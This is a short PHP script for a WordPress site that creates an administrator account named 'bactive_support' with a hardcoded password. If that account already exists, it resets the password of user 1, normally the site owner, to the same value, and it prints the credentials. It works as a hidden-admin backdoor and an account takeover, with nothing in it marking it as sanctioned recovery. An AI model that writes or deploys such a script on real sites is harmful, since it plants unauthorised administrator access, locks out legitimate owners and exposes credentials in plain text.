<?php
require( dirname( __FILE__ ) . '/wp-load.php' );

$username = 'bactive_support';
$password = 'BActiveSupport123!';
$email = 'support@bactiveph.com';

if ( ! username_exists( $username ) ) {
    $user_id = wp_create_user( $username, $password, $email );
    $user = new WP_User( $user_id );
    $user->set_role( 'administrator' );
    echo "Created new admin: $username / $password\n";
} else {
    wp_set_password( $password, 1 ); // Reset user 1
    $user = get_userdata( 1 );
    echo "Reset password for user: " . $user->user_login . " to $password\n";
}
